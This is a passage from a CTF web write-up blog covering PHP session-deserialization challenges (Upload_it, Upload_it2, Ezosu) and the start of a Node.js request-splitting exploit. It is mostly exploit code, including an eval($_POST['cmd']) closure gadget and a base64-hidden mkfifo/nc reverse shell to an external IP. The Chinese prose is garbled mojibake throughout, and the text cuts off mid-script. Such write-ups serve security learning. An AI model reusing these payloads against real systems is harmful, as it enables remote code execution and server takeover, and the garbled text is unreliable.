title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h2><p>å®¡è®¡ä¸€ä¸‹<code>index.php</code>å¯ä»¥å‘ç°<code>      $upload_file_path = $_SESSION[&quot;upload_path&quot;].&quot;/&quot;.$_POST[&#39;path&#39;];</code>è¿›è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¹¶ä¸”è¿™é‡Œçš„<code>$_SESSION[&quot;upload_path&quot;]</code>æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥è”æƒ³åˆ°è§¦å‘<code>toString()</code>å‡½æ•°ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹å‘ç°å¯åˆ©ç”¨ç‚¹</p><p><img src="https://img-blog.csdnimg.cn/0df57b5f05144b7e8f9aff06a55720fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†™expï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br><span class="hljs-title">class</span> <span class="hljs-title">LazyString</span> &#123;<br><span class="hljs-title">private</span> $<span class="hljs-title">value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../vendor/opis/closure/autoload.php&quot;</span>;<br><span class="hljs-variable">$x</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;;<br><span class="hljs-variable">$x</span> = \Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$x</span>);<br><span class="hljs-keyword">$this</span>-&gt;value = unserialize(<span class="hljs-variable">$x</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> \<span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>\<span class="hljs-title">LazyString</span>();<br><span class="hljs-variable">$s</span> = session_start();<br><span class="hljs-keyword">echo</span> session_id();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_path&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>ä¸Šä¼ æœ¬åœ°è¿è¡Œåè·å–çš„sessionæ–‡ä»¶ï¼Œè¦†ç›–æœåŠ¡å™¨ä¸Šçš„sessionæ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/3b1ebf40dffa49efb1dbe5a1b80d5ddb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†æ¬¡è®¿é—®æ—¶ï¼Œä¼šè¯»å–æˆ‘ä»¬è¦†ç›–çš„sessionæ–‡ä»¶ï¼Œå¹¶ä¸”è§¦å‘å‘åºåˆ—åŒ–ï¼Œå› ä¸ºsessionæ–‡ä»¶åºåˆ—åŒ–å†™è¿›å»ï¼Œä¸€å®šä¼šååºåˆ—åŒ–è¯»å‡ºæ¥çš„ã€‚ç„¶åå³å¯æ‰§è¡Œå‘½ä»¤</p><p><img src="https://img-blog.csdnimg.cn/3c3a8f69c24345a5bf56e2d6960d146f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å¤©æ¢çš„éé¢„æœŸ"><a href="#å¤©æ¢çš„éé¢„æœŸ" class="headerlink" title="å¤©æ¢çš„éé¢„æœŸ"></a>å¤©æ¢çš„éé¢„æœŸ</h2><p>è¿™ä¸ªéé¢„æœŸçœŸæ˜¯å¤ªç»†äº†ï¼Œ<code>Sndav</code>ğŸ‘´çœŸæ˜¯å¤ªç‰›äº†ã€‚æ‹¿è¿™ä¸ªexpåŠ¨è°ƒäº†ä¸€ä¸‹ï¼Œå¼€å§‹æ²¡çœ‹æ‡‚ä»€ä¹ˆæ„æ€ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../vendor/autoload.php&quot;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Opis</span>\<span class="hljs-title">Closure</span>\<span class="hljs-title">SerializableClosure</span>;<br>session_start();<br><span class="hljs-variable">$closure</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">123123</span>;<br>&#125;;<br><span class="hljs-comment">// phpinfo();</span><br><span class="hljs-variable">$closure</span> = <span class="hljs-keyword">new</span> SerializableClosure(<span class="hljs-variable">$closure</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$closure</span>;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°èµ°åˆ°<code>$_SESSION[&#39;a&#39;] = $closure;</code>æ—¶è°ƒç”¨<code>serialize</code>å‡½æ•°ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª<code>&#39;function&#39;</code>é”®</p><p><img src="https://img-blog.csdnimg.cn/527f4004ca614f49ba3aa2c16f2b0b16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆ‘ä»¬éœ€è¦å°†æºç æ”¹ä¸º</p><p><img src="https://img-blog.csdnimg.cn/865b8019af5f441d9087dafbb4dc40a4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åè¯¥ä¸‹expå†åŠ¨è°ƒ</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../vendor/autoload.php&quot;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Opis</span>\<span class="hljs-title">Closure</span>\<span class="hljs-title">SerializableClosure</span>;<br>session_start();<br><span class="hljs-variable">$closure</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">123123</span>;<br>&#125;;<br><span class="hljs-comment">// phpinfo();</span><br><span class="hljs-variable">$closure</span> = <span class="hljs-keyword">new</span> SerializableClosure(<span class="hljs-variable">$closure</span>);<br><span class="hljs-variable">$x</span> = Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$closure</span>);<br>unserialize(<span class="hljs-variable">$x</span>);<br></code></pre></div></td></tr></table></figure><p>å½“èµ°åˆ°<code> $data = \serialize($data);</code>è¿™ä¸€æ­¥æ—¶ï¼Œå°±æ˜¯è¿”å›ä¸Šé¢è¯´çš„<code>$ret</code>å˜é‡</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220117001609023.png" alt="image-20220117001609023"></p><p>è¿™æ—¶å¯ä»¥å‘ç°å®ƒåºåˆ—åŒ–åçš„æ•°æ®ä¸­é—´æœ‰æˆ‘ä»¬çš„æ‰§è¡Œå‡½æ•°äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/23d425bf8b65455da0a86474682fddf8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨<code>unserialize</code>ä¸­ï¼Œèµ°åˆ°è¿™ä¸€æ­¥å°±ä¼šæ‰§è¡Œå‘½ä»¤</p><p><img src="https://img-blog.csdnimg.cn/cb667aad79404c1ead4b75bc1ee904c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åé¢çš„åšæ³•ä¹Ÿæ˜¯è¦†ç›–åŸsessionæ–‡ä»¶</p><h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><p>é¢„æœŸè§£æ„Ÿè§‰â€¦æ€ä¹ˆè¯´å‘¢ä¸å¤ªèƒ½ç†è§£ï¼Œä¸çŸ¥é“è¿™ä¸ªåºåˆ—åŒ–çš„åœ°æ–¹åœ¨å“ªï¼Œéœ€è¦ä¼ ä»€ä¹ˆä¸Šå»ã€‚è¦æ˜¯è¦†ç›–sessionçš„è¯ï¼Œé‚£ä¹Ÿæ˜¯è§¦å‘ååºåˆ—åŒ–ï¼Œè¿˜æ˜¯è¯´åé¢è¿˜ä¼šå†å­¦åºåˆ—åŒ–ã€‚expä¹Ÿæ²¡çœ‹æ‡‚æœ€åb64ä¸€ä¸‹æ˜¯åœ¨å¹²å•¥ã€‚</p><h1 id="Upload-it2"><a href="#Upload-it2" class="headerlink" title="Upload_it2"></a>Upload_it2</h1><p>å’Œä¸Šé¢å·®ä¸å¤šã€‚è¿™é‡Œç”¨<code>[$san, &#39;backdoor&#39;]()</code>è°ƒç”¨äº†å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br><span class="hljs-title">class</span> <span class="hljs-title">LazyString</span> &#123;<br><span class="hljs-title">private</span> $<span class="hljs-title">value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;value = <span class="hljs-variable">$x</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>// <span class="hljs-title">use</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sandbox</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;evil = <span class="hljs-variable">$x</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$san</span> = <span class="hljs-keyword">new</span> sandbox(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Symfony\Component\<span class="hljs-keyword">String</span>\LazyString([<span class="hljs-variable">$san</span>, <span class="hljs-string">&#x27;backdoor&#x27;</span>]);<br>session_start();<br><span class="hljs-keyword">echo</span> session_id();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_path&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Ezosu"><a href="#Ezosu" class="headerlink" title="Ezosu"></a>Ezosu</h1><p>é¢˜ç›®ç»™äº†é™„ä»¶æ˜¯èƒ½å¤Ÿåœ¨æœ¬åœ°æ­ç¯å¢ƒçš„ï¼Œå°†dockeré‡Œé¢æ–‡ä»¶æ‰“åŒ…å‡ºæ¥å®¡è®¡ã€‚å…³é”®çš„å‡½æ•°ï¼Œç®€å•çš„ä»¥<code>|</code>ä¸ºåˆ†å‰²é”®åå’Œé”®å€¼ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åœ¨é”®åé‡Œé¢æ’å…¥æ¶æ„ååºåˆ—æ•°æ®ï¼Œå°±èƒ½é€ æˆé€ƒé€¸ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PhpSession</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IFormat</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$k</span> . <span class="hljs-string">&#x27;|&#x27;</span> . serialize(<span class="hljs-variable">$v</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$result</span> = [];<br>        <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$length</span> = \strlen(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$offset</span> &lt; <span class="hljs-variable">$length</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!strstr(substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>), <span class="hljs-string">&#x27;|&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> [];<br>            &#125;<br>            <span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$offset</span>);<br>            <span class="hljs-variable">$num</span> = <span class="hljs-variable">$pos</span> - <span class="hljs-variable">$offset</span>;<br>            <span class="hljs-variable">$varname</span> = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-variable">$num</span>);<br>            <span class="hljs-variable">$offset</span> += <span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$dataItem</span> = unserialize(substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>));<br>            <span class="hljs-variable">$result</span>[<span class="hljs-variable">$varname</span>] = <span class="hljs-variable">$dataItem</span>;<br>            <span class="hljs-variable">$offset</span> += \strlen(serialize(<span class="hljs-variable">$dataItem</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä¾‹å¦‚æˆ‘ä»¬æ’å…¥çš„æ•°æ®ï¼Œä»ç»“æœä¸Šçœ‹æ˜æ˜¾ååºåˆ—åŒ–å‡ºæ¥äº†æˆ‘ä»¬çš„<code>[]</code></p><p><img src="https://img-blog.csdnimg.cn/e49909403b2149d5bf44fae81aa02f74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾é“¾å­ï¼Œæœ€å¼€å§‹æˆ‘æƒ³çš„æ˜¯è¿™ä¸å°±ç›´æ¥<code>LazyString</code>ä¸­è§¦å‘<code>toString</code>ï¼Œå‚æ•°èµ‹å€¼ä¸€ä¸ªé—­åŒ…å‡½æ•°ã€‚åæ¥ä¸€ç›´æ²¡é€šï¼Œå‘ç°æˆ‘æ˜¯æ†¨æ‰¹ï¼Œå®ƒè¿™é‡Œä¸å’Œä¸Šé¢æ–‡ä»¶ä¸Šä¼ é‚£ä¸ªä¸€æ ·ï¼Œå› ä¸ºä¸Šé¢çš„å®ç°äº†å¯¹äºé—­åŒ…å‡½æ•°çš„åºåˆ—åŒ–ï¼Œè¿™é‡Œæ— æ³•å¯¹é—­åŒ…å‡½æ•°è¿›è¡Œåºåˆ—åŒ–ï¼Œæ‰€ä»¥æ— æ³•å°†å‚æ•°åˆå§‹åŒ–ã€‚æœ€ç»ˆexpï¼ˆè¿™é‡Œè¿˜æœ‰ä¸ªå‘å°±æ˜¯å®ƒæ˜¯shå‘½ä»¤çš„æ¶æ„ï¼Œä¸èƒ½ç”¨bashåå¼¹shellï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PhpOption</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Option</span>&#123;<br><br>        &#125;<br>    <span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">LazyOption</span> <span class="hljs-title">extends</span> <span class="hljs-title">Option</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">callback</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$arguments</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$option</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;arguments = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMzkuMTA3LjIzOS4zMCAyMzMzID4vdG1wL2YK | base64 -d|sh&quot;</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">PhpOption</span>\<span class="hljs-title">LazyOption</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyString</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;value = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> LazyOption(),<span class="hljs-string">&quot;get&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>\<span class="hljs-title">LazyString</span>();<br><span class="hljs-variable">$p</span> = serialize(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$payload</span>  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;e&quot;</span>=&gt;<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c|&quot;</span>.<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-comment">// var_dump($payload).&quot;\n&quot;;</span><br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$payload</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/32ee3c5527be4ccfb52df760be15b3ac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejsé¢˜ç›®è®°å½•</title>
    <link href="/2022/01/10/nodejs%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/01/10/nodejs%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p><p><a href="https://r3billions.com/writeup-split-second/">å‡ºé¢˜äººå‚è€ƒçš„é¢˜ç›®</a></p><p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">å‡ºé¢˜äººè‡ªå·±æ€è·¯</a></p><p>é¢˜ç›®ä¹ŸæŒºè€äº†æ„Ÿè§‰ï¼Œè¿™é‡Œçš„nodeç‰ˆæœ¬ä¸º8ï¼Œæ˜¯å­˜åœ¨httpæ‹†åˆ†è¯·æ±‚æ”»å‡»çš„ã€‚ç»™äº†æºç ï¼Œå®¡è®¡ä¸€ä¸‹ã€‚nodejsèµ°ç§æ‰“ssrfã€‚è‡ªå·±å†™çš„æ²¡æ‰“é€šï¼Œçœ‹ç½‘ä¸Šæœ‰äº›ä¹Ÿä¸æ‰“é€šï¼Œç¯å¢ƒä¼šå´©ï¼Œæ‰¾äº†ä¸€ä¸ªèƒ½æ‰“é€šã€‚è¿™é‡Œå°†å­—ç¬¦unicodeç¼–ç ï¼Œå› ä¸ºnode8é‡‡ç”¨çš„å•å­—èŠ‚latinç¼–ç ï¼Œä¼šå°†é«˜å­—èŠ‚ä½æˆªæ‰ï¼Œåªå‰©ä¸‹ä½å­—èŠ‚ä½ã€‚ä¹Ÿå¯ç”¨<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag.txt&#39;);</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynWjDdj9HcJ7ILyVa</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>body = <span class="hljs-string">&quot;&quot;&quot;------WebKitFormBoundarynWjDdj9HcJ7ILyVa</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = 